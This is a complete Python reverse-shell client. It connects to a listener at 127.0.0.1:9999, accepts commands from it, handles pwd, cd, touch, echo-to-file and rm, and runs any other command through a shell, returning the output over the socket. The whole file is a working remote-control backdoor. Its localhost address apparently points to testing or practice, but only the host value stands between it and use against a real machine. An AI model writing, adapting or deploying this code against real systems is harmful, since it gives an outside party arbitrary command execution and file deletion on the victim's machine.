#!/usr/bin/python3
import socket
import os
import subprocess  # Added for capturing shell command output

def print_current_directory(socket_client):
    pwd = os.getcwd()
    socket_client.sendall(pwd.encode('utf-8'))

def change_current_dir(socket_client, new_path):
    try:
        os.chdir(new_path if new_path else '..')
        print_current_directory(socket_client)
    except FileNotFoundError:
        feedback = "Error: Directory not found."
        socket_client.sendall(feedback.encode('utf-8'))

def create_a_file(socket_client, file_name):
    clean_name = file_name.strip()
    try:
        with open(clean_name, 'x'):
            pass
        feedback = f"File '{clean_name}' created successfully."
    except FileExistsError:
        feedback = f"Error: File '{clean_name}' already exists."
    socket_client.sendall(feedback.encode('utf-8'))

def write_content_file(socket_client, file_name, file_content):
    try:
        with open(file_name, 'w') as f:
            f.write(file_content)
        feedback = f"Content written to '{file_name}' successfully."
    except Exception as e:
        feedback = f"Error writing to file '{file_name}': {e}"
    socket_client.sendall(feedback.encode('utf-8'))

def delete_file(socket_client, file_name):
    clean_name = file_name.strip()
    full_path = os.path.join(os.getcwd(), clean_name)
    try:
        os.remove(full_path)
        feedback = f"File deleted: {full_path}"
    except FileNotFoundError:
        feedback = f"Error: File '{clean_name}' not found."
    socket_client.sendall(feedback.encode('utf-8'))

host = "127.0.0.1"
port = 9999

try:
    # Create socket object
    socket_client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    socket_client.connect((host, port))

    while True:
        # Accept message from the server
        cmd = socket_client.recv(1024).decode().strip()

        if cmd == "exit":
            feedback = "quit"
            socket_client.sendall(feedback.encode('utf-8'))
            break
        elif cmd == "pwd":
            print_current_directory(socket_client)
        elif cmd.startswith("cd "):
            change_current_dir(socket_client, cmd[3:])
        elif cmd.startswith("touch "):
            create_a_file(socket_client, cmd[6:])
        elif "echo" in cmd and ">" in cmd:
            parts = cmd.split(">", 1)
            if len(parts) == 2:
                file_content = parts[0].replace("echo", "").strip().strip('"')
                file_name = parts[1].strip()
                write_content_file(socket_client, file_name, file_content)
        elif cmd.startswith("rm "):
            delete_file(socket_client, cmd[3:])
        else:
            try:
                process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                output, error = process.communicate()
                feedback = output.decode() if output else error.decode()
            except Exception as e:
                feedback = f"Error executing command: {e}"
            socket_client.sendall(feedback.encode('utf-8'))

except socket.error as error:
    feedback = f"Socket error: {error}"
    socket_client.sendall(feedback.encode('utf-8'))

finally:
    socket_client.close()
